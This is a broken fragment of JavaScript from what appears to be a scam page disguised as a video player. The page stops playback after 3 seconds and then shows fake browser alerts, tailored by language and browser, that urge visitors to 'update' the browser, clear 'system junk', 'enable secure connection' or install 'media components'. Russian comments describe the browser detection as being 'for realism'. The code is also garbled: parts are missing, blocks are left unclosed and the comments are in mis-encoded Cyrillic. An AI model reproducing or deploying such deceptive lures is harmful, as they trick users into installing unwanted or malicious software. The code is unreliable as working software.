  <script>
    "use strict";
    (function () {

      const detectLang = () => {
        const q = (sp.get("lang") || sp.get("l") || "").trim().toLowerCase();
        if (q) return q;
        const h = (document.documentElement.getAttribute("lang") || "").trim().toLowerCase();
        if (h) return h;
        return (navigator.language || "en").toLowerCase();
      };

      const norm = (l) => {
        l = (l || "").toLowerCase();
        if (l === "ua") l = "uk";
        if (l === "cz") l = "cs";
        if (l.includes("-")) l = l.split("-")[0];
        return l;

      // –û–ü–†–ï–î–ï–õ–ï–ù–ò–ï –ë–†–ê–£–ó–ï–†–ê –î–õ–Ø –†–ï–ê–õ–ò–ó–ú–ê
      const getBrowserName = () => {
          const ua = navigator.userAgent;
          if (ua.includes("Firefox")) return "Firefox";
          if (ua.includes("SamsungBrowser")) return "Samsung Browser";
          if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
          if (ua.includes("Edge")) return "Edge";
          if (ua.includes("Chrome")) return "Chrome";
          if (ua.includes("Safari")) return "Safari";
          return "Browser";
      };

      // --- –°–õ–û–í–ê–†–¨ –° –ü–õ–ï–ô–°–•–û–õ–î–ï–†–ê–ú–ò {browser} –∏ {country} ---

          leave: "Leave",

          t2: { h: "Storage limit reached", t: "To continue playback, please clear your {browser} cache or system junk files.", b: "CLEAR NOW", c: "CANCEL" },
          t3: { h: "Content restricted", t: "This media is restricted in {country}. Please enable secure connection to watch.", b: "ENABLE", c: "CANCEL" },

        },

          stay: "–û—Å—Ç–∞—Ç—å—Å—è",
          leave: "–£–π—Ç–∏",
          t1: { h: "–û–±–Ω–æ–≤–∏—Ç–µ {browser}", t: "–í–∞—à–∞ –≤–µ—Ä—Å–∏—è {browser} –±–æ–ª—å—à–µ –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è. –û–±–Ω–æ–≤–∏—Ç–µ –±—Ä–∞—É–∑–µ—Ä –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –≤–∏–¥–µ–æ.", b: "–û–ë–ù–û–í–ò–¢–¨", c: "–û–¢–ú–ï–ù–ê" },
          t2: { h: "–ü–∞–º—è—Ç—å –ø–µ—Ä–µ–ø–æ–ª–Ω–µ–Ω–∞", t: "–î–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è –æ—á–∏—Å—Ç–∏—Ç–µ –∫—ç—à {browser} –∏–ª–∏ —Å–∏—Å—Ç–µ–º–Ω—ã–π –º—É—Å–æ—Ä.", b: "–û–ß–ò–°–¢–ò–¢–¨", c: "–û–¢–ú–ï–ù–ê" },

          t4: { h: "–û—à–∏–±–∫–∞ –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è", t: "–î–ª—è –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è —ç—Ç–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç–∞ —Ç—Ä–µ–±—É–µ—Ç—Å—è –æ–±–Ω–æ–≤–∏—Ç—å –º–µ–¥–∏–∞-–∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã.", b: "–£–°–¢–ê–ù–û–í–ò–¢–¨", c: "–û–¢–ú–ï–ù–ê" }
        }
      };

      window.__getModalCopy = function () {
        const lang = norm(detectLang());
        return MODAL_I18N[lang] || MODAL_I18N.en;

      document.addEventListener("DOMContentLoaded", () => {
        const typeId = sp.get('type') || '4';
        
        // –ü–û–õ–£–ß–ê–ï–ú –°–¢–†–ê–ù–£ (–ï—Å–ª–∏ –Ω–µ—Ç –≤ —Å—Å—ã–ª–∫–µ - —Å—Ç–∞–≤–∏–º —Ñ–æ–ª–±–µ–∫)

        // –ü–û–õ–£–ß–ê–ï–ú –ë–†–ê–£–ó–ï–†
        const browser = getBrowserName();
        
        const dict = window.__getModalCopy(); 
        let content = dict['t' + typeId] || dict['t4'];

        // –ó–ê–ú–ï–ù–Ø–ï–ú –ü–õ–ï–ô–°–•–û–õ–î–ï–†–´ –í –ó–ê–ì–û–õ–û–í–ö–ï –ò –¢–ï–ö–°–¢–ï
        const textHead = content.h.replace(/{browser}/g, browser);

  <script>
    "use strict";
    document.addEventListener("DOMContentLoaded", () => {
      const video = document.querySelector(".xh-video-element");
      const playBtn = document.querySelector(".xh-main-play-trigger");
      if (!video || !playBtn) return;
      const sp = new URL(location.href).searchParams;
      const STOP_AT = 3.0;
      const startTime = parseFloat(sp.get("t")) || 0;
      const POSTER = sp.get("__poster") || video.getAttribute("data-poster") || "./assets/poster-3s.webp";

      if (sp.get("__cl") === "1" || sp.get("__skipPreview") === "1") {
        try { video.pause(); } catch {}
        try { video.currentTime = startTime; video.setAttribute("poster", POSTER); video.load(); } catch {}
        playBtn.classList.add("ready");
        return;
      }

      let done = false;
      const cleanup = () => {
        clearTimeout(hardFallback); clearTimeout(playWatchdog);
        video.removeEventListener("timeupdate", onTime);
      };

      const finish = () => {
        if (done) return; done = true;
        try { video.pause(); video.currentTime = STOP_AT; video.setAttribute("poster", POSTER); } catch {}
        playBtn.classList.add("ready");
        cleanup();
      };

      const onTime = () => { if (video.currentTime >= STOP_AT) finish(); };
      video.addEventListener("timeupdate", onTime);
      const hardFallback = setTimeout(finish, 3500);
      const playWatchdog = setTimeout(() => { if ((video.currentTime || 0) <= 0.05) finish(); }, 2200);

      const start = async () => {
        try { video.muted = true; video.playsInline = true; const pr = video.play(); if (pr && pr.then) await pr; } catch { finish(); }
      };

      if (document.visibilityState === "visible") start();
      else {
        const onFirstVisible = () => { if (document.visibilityState === "visible") { start(); document.removeEventListener("visibilitychange", onFirstVisible); } };
        document.addEventListener("visibilitychange", onFirstVisible);
      }
    });
  </script>

  <script>
    "use strict";
    (function () {
      function applyModalI18n() {
        if (typeof window.__getModalCopy !== "function") return;
        const copy = window.__getModalCopy();
        const root = document.getElementById("xh_exit_modal");
        if (!root) return;
        const set = (key, val) => { const el = root.querySelector(`[data-i18n="${key}"]`); if (el) el.textContent = val; };
        set("title", copy.title); set("desc", copy.desc); set("stay", copy.stay); set("leave", copy.leave);
      }
      if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", applyModalI18n, { once: true });
      else applyModalI18n();
      window.applyModalI18n = applyModalI18n;
    })();
  </script>
